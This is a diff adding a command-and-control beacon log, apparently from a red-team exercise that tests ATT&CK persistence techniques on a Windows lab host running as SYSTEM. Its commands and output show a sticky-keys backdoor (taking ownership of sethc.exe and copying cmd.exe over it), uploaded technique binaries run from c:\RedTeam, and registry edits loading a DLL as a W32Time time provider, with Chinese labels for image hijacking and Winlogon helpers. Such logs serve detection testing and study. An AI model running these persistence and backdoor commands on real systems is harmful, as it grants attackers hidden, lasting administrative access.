@@ -1,0 +1,107 @@
+02/26 14:12:35 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 14292; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/26 14:13:41 [task] 镜像劫持
+02/26 14:14:32 [checkin] host called home, sent: 220 bytes
+02/26 14:14:32 [output]
+received output:
+操作成功完成。
+
+C:\Users\a\Desktop>
+
+02/26 15:27:54 [task] 恢复
+02/26 15:28:34 [checkin] host called home, sent: 186 bytes
+02/26 15:28:34 [output]
+received output:
+操作成功完成。
+
+C:\Users\a\Desktop>
+
+02/26 15:35:44 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
+02/26 15:35:44 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
+02/26 15:35:44 [task] Tasked beacon to run: copy cmd.exe sethc.exe
+02/26 15:35:44 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 15:35:44 [task] cd c:\RedTeam\
+02/26 15:35:44 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
+02/26 15:35:44 [indicator] file: 7c853a34c61bc47dd03e7c18e66db1ba 7680 bytes T1015.exe
+02/26 15:35:44 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
+02/26 15:36:34 [checkin] host called home, sent: 8012 bytes
+02/26 15:36:35 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。
+
+
+02/26 15:36:35 [output]
+received output:
+已处理的文件: C:\Windows\System32\sethc.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/26 15:36:35 [output]
+received output:
+系统找不到指定的文件。
+
+
+02/26 15:36:35 [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
+   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
+   子网掩码  . . . . . . . . . . . . : 255.255.254.0
+   默认网关. . . . . . . . . . . . . : 172.17.2.1
+
+隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
+02/26 15:49:16 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 15:49:16 [task] cd c:\RedTeam\
+02/26 15:49:16 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1112.exe as T1112.exe
+02/26 15:49:16 [indicator] file: 07c5c097bd5cffd297043bee15dab5cf 7680 bytes T1112.exe
+02/26 15:49:16 [task] 修改
+02/26 15:49:16 [task] Tasked beacon to run: c:\RedTeam\T1112.exe
+02/26 15:49:35 [checkin] host called home, sent: 7790 bytes
+02/26 16:22:36 [task] cd C:\Windows\System32\
+02/26 16:22:36 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname /t REG_SZ /f /D "c:\test.dll"
+02/26 16:22:36 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe Add HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname /t REG_SZ /f /D "c:\test.dll"
+02/26 16:22:37 [checkin] host called home, sent: 455 bytes
+02/26 16:22:48 [output]
+received output:
+操作成功完成。
+
+C:\Windows\System32>
+
+02/26 16:22:48 [output]
+received output:
+操作成功完成。
+
+C:\Windows\System32>
+
+02/26 16:23:13 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpClient /v dllname  /f 
+02/26 16:23:13 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W32Time\TimeProviders\NtpServer  /v dllname  /f 
+02/26 16:23:23 [task] 设置Winlogon 加载项
+02/26 16:23:23 [task] Tasked beacon to make directory c:\RedTeam\
+02/26 16:23:23 [task] cd c:\RedTeam\
+02/26 16:23:23 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/26 16:23:23 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
+02/26 16:23:23 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/26 16:23:48 [checkin] host called home, sent: 8173 bytes
+02/26 16:23:48 [output]
+received output:
+操作成功完成。
+
+C:\Windows\System32>
+
+02/26 16:23:48 [output]
+received output:
+操作成功完成。
+
+C:\Windows\System32>
+
